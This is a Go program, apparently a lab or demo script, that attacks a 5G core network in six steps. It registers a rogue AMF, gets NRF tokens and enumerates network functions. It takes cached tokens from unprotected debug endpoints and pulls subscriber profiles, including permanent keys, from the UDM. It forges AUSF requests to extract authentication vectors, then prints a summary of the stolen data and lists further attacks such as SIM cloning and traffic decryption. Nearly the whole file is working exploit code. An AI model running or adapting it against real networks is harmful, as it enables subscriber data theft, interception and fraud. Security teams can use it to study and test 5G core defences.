package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ── Color constants ──
const (
	colorRed    = "\033[91m"
	colorGreen  = "\033[92m"
	colorYellow = "\033[93m"
	colorBlue   = "\033[94m"
	colorCyan   = "\033[96m"
	colorBold   = "\033[1m"
	colorDim    = "\033[2m"
	colorReset  = "\033[0m"
)

// AttackContext holds state accumulated across attack steps.
type AttackContext struct {
	NRFURI           string
	NRFToken         string
	StolenTokens     []StolenToken
	DiscoveredNFs    []NFInfo
	SubscriberData   []map[string]interface{}
	AUSFAuthVectors  map[string]interface{}
}

// StolenToken represents a token extracted during the attack.
type StolenToken struct {
	Token    string
	Scope    string
	IssuedTo string
	NFType   string
	Source   string
}

// NFInfo holds discovered NF information.
type NFInfo struct {
	InstanceID string
	NFType     string
	Host       string
	Port       int
}

// ── Helper functions ──

func info(msg string) {
	fmt.Printf("  %s[*]%s %s\n", colorCyan, colorReset, msg)
}

func success(msg string) {
	fmt.Printf("  %s[✓]%s %s\n", colorGreen, colorReset, msg)
}

func fail(msg string) {
	fmt.Printf("  %s[✗]%s %s\n", colorRed, colorReset, msg)
}

func warn(msg string) {
	fmt.Printf("  %s[!]%s %s\n", colorYellow, colorReset, msg)
}

func stepBanner(num int, title string) {
	fmt.Printf("\n%s%s", colorBold, colorYellow)
	fmt.Printf("  ┌─────────────────────────────────────────────────────┐\n")
	fmt.Printf("  │  STEP %d: %-43s│\n", num, title)
	fmt.Printf("  └─────────────────────────────────────────────────────┘\n")
	fmt.Print(colorReset)
}

func decodeJWTPayload(token string) map[string]interface{} {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil
	}
	padding := 4 - len(parts[1])%4
	if padding == 4 {
		padding = 0
	}
	decoded, err := base64.URLEncoding.DecodeString(parts[1] + strings.Repeat("=", padding))
	if err != nil {
		return nil
	}
	var claims map[string]interface{}
	json.Unmarshal(decoded, &claims)
	return claims
}

func printJWT(token string) {
	claims := decodeJWTPayload(token)
	if claims == nil {
		fmt.Printf("    %sFailed to decode JWT%s\n", colorRed, colorReset)
		return
	}
	fmt.Printf("    %s┌── JWT Claims ──────────────────────────────────┐%s\n", colorDim, colorReset)
	for k, v := range claims {
		fmt.Printf("    %s│%s  %-12s → %s%v%s\n", colorDim, colorReset, k, colorCyan, v, colorReset)
	}
	fmt.Printf("    %s└────────────────────────────────────────────────┘%s\n", colorDim, colorReset)
}

// ── Step 1: Registration ──

func Step1_Registration(ctx *AttackContext) error {
	stepBanner(1, "ROGUE NF REGISTRATION")
	info("Registering rogue NF with NRF as type 'AMF' (spoofed)...")

	// Register rogue NF
	profile := map[string]interface{}{
		"nfType":     "AMF",
		"host":       "attacker",
		"port":       8005,
		"nfServices": []string{"namf-comm"},
	}
	body, _ := json.Marshal(profile)

	req, err := http.NewRequest("PUT",
		fmt.Sprintf("%s/nnrf-nfm/v1/nf-instances/rogue-amf-666", ctx.NRFURI),
		strings.NewReader(string(body)))
	if err != nil {
		return fmt.Errorf("failed to create registration request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("NRF registration failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusCreated || resp.StatusCode == http.StatusOK {
		success(fmt.Sprintf("Rogue NF registered with NRF (status: %d)", resp.StatusCode))
	} else {
		return fmt.Errorf("registration rejected: %d", resp.StatusCode)
	}

	// Request access token
	info("Requesting NRF access token with scope 'nnrf-disc'...")
	tokenResp, err := http.PostForm(fmt.Sprintf("%s/oauth2/token", ctx.NRFURI), url.Values{
		"grant_type":   {"client_credentials"},
		"nfInstanceId": {"rogue-amf-666"},
		"scope":        {"nnrf-disc"},
		"nfType":       {"AMF"},
	})
	if err != nil {
		return fmt.Errorf("token request failed: %w", err)
	}
	defer tokenResp.Body.Close()

	var tokenResult map[string]interface{}
	json.NewDecoder(tokenResp.Body).Decode(&tokenResult)

	token, ok := tokenResult["access_token"].(string)
	if !ok {
		return fmt.Errorf("no access_token in NRF response")
	}

	ctx.NRFToken = token
	success("Legitimate NRF access token obtained!")
	fmt.Printf("\n    %sRaw JWT:%s\n    %s%s...%s\n", colorBold, colorReset,
		colorDim, token[:60], colorReset)
	fmt.Println()
	printJWT(token)

	return nil
}

// ── Step 2: NF Discovery ──

func Step2_NFDiscovery(ctx *AttackContext) error {
	stepBanner(2, "NF DISCOVERY & ENUMERATION")
	info("Using NRF token to enumerate all registered Network Functions...")

	// Discover all NF types
	nfTypes := []string{"UDM", "AUSF", "AMF", "SMF"}

	for _, nfType := range nfTypes {
		discURL := fmt.Sprintf("%s/nnrf-disc/v1/nf-instances?target-nf-type=%s", ctx.NRFURI, nfType)
		req, err := http.NewRequest("GET", discURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+ctx.NRFToken)

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			warn(fmt.Sprintf("Discovery failed for %s: %v", nfType, err))
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var result struct {
			NFInstances []struct {
				NFInstanceID string   `json:"nfInstanceId"`
				NFType       string   `json:"nfType"`
				Host         string   `json:"host"`
				Port         int      `json:"port"`
				Services     []string `json:"nfServices"`
			} `json:"nfInstances"`
		}
		json.Unmarshal(body, &result)

		for _, nf := range result.NFInstances {
			ctx.DiscoveredNFs = append(ctx.DiscoveredNFs, NFInfo{
				InstanceID: nf.NFInstanceID,
				NFType:     nf.NFType,
				Host:       nf.Host,
				Port:       nf.Port,
			})
			success(fmt.Sprintf("Found %s: %s at %s:%d (services: %v)",
				nf.NFType, nf.NFInstanceID, nf.Host, nf.Port, nf.Services))
		}
	}

	fmt.Printf("\n    %sDiscovered %d NF instances total%s\n", colorBold, len(ctx.DiscoveredNFs), colorReset)
	return nil
}

// ── Step 3: Cross-Service Token Finding ──

func Step3_CrossServiceTokenFinding(ctx *AttackContext) error {
	stepBanner(3, "CROSS-SERVICE TOKEN FINDING")
	info("Probing NF debug endpoints for cached tokens...")
	warn("Exploiting missing scope enforcement on /debug/token-store")

	targets := []struct {
		name string
		url  string
	}{
		{"AMF", "http://amf:8003"},
		{"AUSF", "http://ausf:8002"},
	}

	for _, target := range targets {
		fmt.Printf("\n    %s── Probing %s ──%s\n", colorYellow, target.name, colorReset)

		req, err := http.NewRequest("GET", target.url+"/debug/token-store", nil)
		if err != nil {
			fail(fmt.Sprintf("Failed to create request for %s: %v", target.name, err))
			continue
		}
		req.Header.Set("Authorization", "Bearer "+ctx.NRFToken)

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			fail(fmt.Sprintf("%s not reachable: %v", target.name, err))
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == http.StatusForbidden {
			info(fmt.Sprintf("%s rejected our token (scope enforced) — status %d", target.name, resp.StatusCode))
			continue
		}

		if resp.StatusCode != http.StatusOK {
			warn(fmt.Sprintf("%s returned status %d", target.name, resp.StatusCode))
			continue
		}

		success(fmt.Sprintf("%s /debug/token-store accessible! (scope NOT enforced)", target.name))

		var storeData struct {
			CachedTokens []struct {
				Token     string `json:"token"`
				Scope     string `json:"scope"`
				IssuedTo  string `json:"issuedTo"`
				NFType    string `json:"nfType"`
				ExpiresAt string `json:"expiresAt"`
			} `json:"cachedTokens"`
		}
		json.Unmarshal(body, &storeData)

		for _, ct := range storeData.CachedTokens {
			warn(fmt.Sprintf("STOLEN TOKEN: scope=%s, issuedTo=%s, type=%s",
				ct.Scope, ct.IssuedTo, ct.NFType))
			ctx.StolenTokens = append(ctx.StolenTokens, StolenToken{
				Token:    ct.Token,
				Scope:    ct.Scope,
				IssuedTo: ct.IssuedTo,
				NFType:   ct.NFType,
				Source:   target.name,
			})
			printJWT(ct.Token)
		}
	}

	fmt.Printf("\n    %s%sTotal tokens stolen: %d%s\n", colorBold, colorRed, len(ctx.StolenTokens), colorReset)
	return nil
}

// ── Step 4: Token Reuse / Impersonation ──

func Step4_TokenReuse(ctx *AttackContext) error {
	stepBanner(4, "TOKEN REUSE / IMPERSONATION")
	info("Searching stolen tokens for UDM-scoped tokens...")

	var udmToken string
	for _, st := range ctx.StolenTokens {
		if strings.Contains(st.Scope, "nudm-sdm") {
			udmToken = st.Token
			success(fmt.Sprintf("Found UDM token (originally issued to: %s)", st.IssuedTo))
			break
		}
	}

	if udmToken == "" {
		warn("No UDM-scoped token found. Requesting one directly from NRF...")
		// Exploit: NRF doesn't validate NF-type to scope mapping
		tokenResp, err := http.PostForm(fmt.Sprintf("%s/oauth2/token", ctx.NRFURI), url.Values{
			"grant_type":   {"client_credentials"},
			"nfInstanceId": {"rogue-amf-666"},
			"scope":        {"nudm-sdm"},
			"nfType":       {"AMF"},
		})
		if err != nil {
			return fmt.Errorf("failed to get UDM token: %w", err)
		}
		defer tokenResp.Body.Close()

		var result map[string]interface{}
		json.NewDecoder(tokenResp.Body).Decode(&result)
		if t, ok := result["access_token"].(string); ok {
			udmToken = t
			success("NRF issued UDM-scoped token to our rogue NF (no scope validation!)")
		}
	}

	if udmToken == "" {
		return fmt.Errorf("could not obtain UDM token by any method")
	}

	// Query subscriber data
	targetIMSIs := []string{
		"imsi-001010000000001",
		"imsi-001010000000002",
	}

	info("Using stolen/obtained UDM token to query subscriber data...")

	// Find UDM endpoint
	udmEndpoint := "http://udm:8001"
	for _, nf := range ctx.DiscoveredNFs {
		if nf.NFType == "UDM" {
			udmEndpoint = fmt.Sprintf("http://%s:%d", nf.Host, nf.Port)
			break
		}
	}

	for _, imsi := range targetIMSIs {
		fmt.Printf("\n    %s── Querying %s ──%s\n", colorYellow, imsi, colorReset)

		req, err := http.NewRequest("GET",
			fmt.Sprintf("%s/nudm-sdm/v1/%s/am-data", udmEndpoint, imsi), nil)
		if err != nil {
			fail(fmt.Sprintf("Request creation failed: %v", err))
			continue
		}
		req.Header.Set("Authorization", "Bearer "+udmToken)

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			fail(fmt.Sprintf("UDM query failed: %v", err))
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			success(fmt.Sprintf("SUBSCRIBER DATA EXTRACTED for %s!", imsi))
			var subData map[string]interface{}
			json.Unmarshal(body, &subData)
			ctx.SubscriberData = append(ctx.SubscriberData, subData)

			prettyJSON, _ := json.MarshalIndent(subData, "    ", "  ")
			fmt.Printf("    %s%s%s\n", colorCyan, string(prettyJSON), colorReset)
		} else {
			fail(fmt.Sprintf("UDM rejected request: %d", resp.StatusCode))
		}
	}

	return nil
}

// ── Step 5: Lateral Movement ──

func Step5_LateralMovement(ctx *AttackContext) error {
	stepBanner(5, "LATERAL MOVEMENT")
	info("Attempting to use stolen AUSF tokens for auth vector access...")

	var ausfToken string
	for _, st := range ctx.StolenTokens {
		if strings.Contains(st.Scope, "nausf-auth") {
			ausfToken = st.Token
			success(fmt.Sprintf("Found AUSF token (scope: %s, from: %s)", st.Scope, st.Source))
			break
		}
	}

	if ausfToken == "" {
		warn("No AUSF token in stolen cache. Requesting from NRF...")
		tokenResp, err := http.PostForm(fmt.Sprintf("%s/oauth2/token", ctx.NRFURI), url.Values{
			"grant_type":   {"client_credentials"},
			"nfInstanceId": {"rogue-amf-666"},
			"scope":        {"nausf-auth"},
			"nfType":       {"AMF"},
		})
		if err != nil {
			return fmt.Errorf("failed to get AUSF token: %w", err)
		}
		defer tokenResp.Body.Close()
		var result map[string]interface{}
		json.NewDecoder(tokenResp.Body).Decode(&result)
		if t, ok := result["access_token"].(string); ok {
			ausfToken = t
			success("Obtained AUSF-scoped token")
		}
	}

	if ausfToken == "" {
		return fmt.Errorf("could not obtain AUSF token")
	}

	// Find AUSF endpoint
	ausfEndpoint := "http://ausf:8002"
	for _, nf := range ctx.DiscoveredNFs {
		if nf.NFType == "AUSF" {
			ausfEndpoint = fmt.Sprintf("http://%s:%d", nf.Host, nf.Port)
			break
		}
	}

	// Attempt UE authentication to get auth vectors
	info("Forging UE authentication request to extract auth vectors...")

	authReq := map[string]string{
		"supiOrSuci":         "imsi-001010000000001",
		"servingNetworkName": "5G:mnc001.mcc001.3gppnetwork.org",
	}
	authBody, _ := json.Marshal(authReq)

	req, err := http.NewRequest("POST",
		ausfEndpoint+"/nausf-auth/v1/ue-authentications",
		strings.NewReader(string(authBody)))
	if err != nil {
		return fmt.Errorf("failed to create auth request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+ausfToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fail(fmt.Sprintf("AUSF auth request failed: %v", err))
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode == http.StatusCreated || resp.StatusCode == http.StatusOK {
		success("Authentication vectors extracted!")
		var authData map[string]interface{}
		json.Unmarshal(body, &authData)
		ctx.AUSFAuthVectors = authData

		prettyJSON, _ := json.MarshalIndent(authData, "    ", "  ")
		fmt.Printf("    %s%s%s\n", colorCyan, string(prettyJSON), colorReset)

		warn("With these vectors an attacker can:")
		fmt.Printf("    • Derive session keys (Kausf → Kseaf → Kamf)\n")
		fmt.Printf("    • Decrypt user traffic\n")
		fmt.Printf("    • Perform MITM on the radio interface\n")
	} else {
		warn(fmt.Sprintf("AUSF returned status %d — scope may be enforced", resp.StatusCode))
	}

	return nil
}

// ── Step 6: Exfiltration Summary ──

func Step6_ExfiltrationSummary(ctx *AttackContext) {
	fmt.Printf("\n%s%s", colorBold, colorRed)
	fmt.Println("  ╔══════════════════════════════════════════════════════════════╗")
	fmt.Println("  ║              EXFILTRATION SUMMARY REPORT                    ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════════╝")
	fmt.Print(colorReset)

	// Tokens
	fmt.Printf("\n  %s%s── STOLEN TOKENS (%d) ──%s\n", colorBold, colorYellow, len(ctx.StolenTokens), colorReset)
	for i, st := range ctx.StolenTokens {
		fmt.Printf("    %s#%d%s  Scope: %s%-14s%s  From: %s%-6s%s  IssuedTo: %s%s%s\n",
			colorBold, i+1, colorReset,
			colorGreen, st.Scope, colorReset,
			colorCyan, st.Source, colorReset,
			colorYellow, st.IssuedTo, colorReset)
		fmt.Printf("        Token: %s%s...%s\n", colorDim, st.Token[:40], colorReset)
	}

	// NF Endpoints
	fmt.Printf("\n  %s%s── DISCOVERED NF ENDPOINTS (%d) ──%s\n", colorBold, colorYellow, len(ctx.DiscoveredNFs), colorReset)
	for _, nf := range ctx.DiscoveredNFs {
		fmt.Printf("    • %s%-6s%s  %s (http://%s:%d)\n",
			colorCyan, nf.NFType, colorReset, nf.InstanceID, nf.Host, nf.Port)
	}

	// Subscriber Data
	fmt.Printf("\n  %s%s── EXTRACTED SUBSCRIBER PROFILES (%d) ──%s\n", colorBold, colorYellow, len(ctx.SubscriberData), colorReset)
	for _, sub := range ctx.SubscriberData {
		supi, _ := sub["supi"].(string)
		name, _ := sub["subscriberName"].(string)
		msisdn, _ := sub["msisdn"].(string)
		key, _ := sub["permanentKey"].(string)
		billing, _ := sub["billingPlan"].(string)
		fmt.Printf("    %s%s%s (%s)\n", colorBold, supi, colorReset, name)
		fmt.Printf("      MSISDN: %s  Key: %s...  Billing: %s\n",
			msisdn, key[:16], billing)
	}

	// Auth Vectors
	if ctx.AUSFAuthVectors != nil {
		fmt.Printf("\n  %s%s── AUTHENTICATION VECTORS ──%s\n", colorBold, colorYellow, colorReset)
		if av, ok := ctx.AUSFAuthVectors["authenticationVector"].(map[string]interface{}); ok {
			for k, v := range av {
				fmt.Printf("    %s%-6s%s → %v\n", colorCyan, k, colorReset, v)
			}
		}
	}

	// Attack Next Steps
	fmt.Printf("\n  %s%s── ATTACKER NEXT STEPS ──%s\n", colorBold, colorRed, colorReset)
	steps := []string{
		"IMSI Harvesting → Track subscriber locations via LAC codes",
		"Session Key Derivation → Decrypt user traffic with Kausf",
		"Billing Fraud → Manipulate PDU sessions via SMF for free data",
		"Persistent Access → Reuse tokens until expiry (1 hour window)",
		"MITM Attack → Use auth vectors for radio interface interception",
		"Identity Theft → Clone subscriber using permanentKey + OPc",
	}
	for i, s := range steps {
		fmt.Printf("    %s%d.%s %s\n", colorYellow, i+1, colorReset, s)
	}

	fmt.Printf("\n%s%s  Attack simulation complete.%s\n\n", colorBold, colorGreen, colorReset)
}
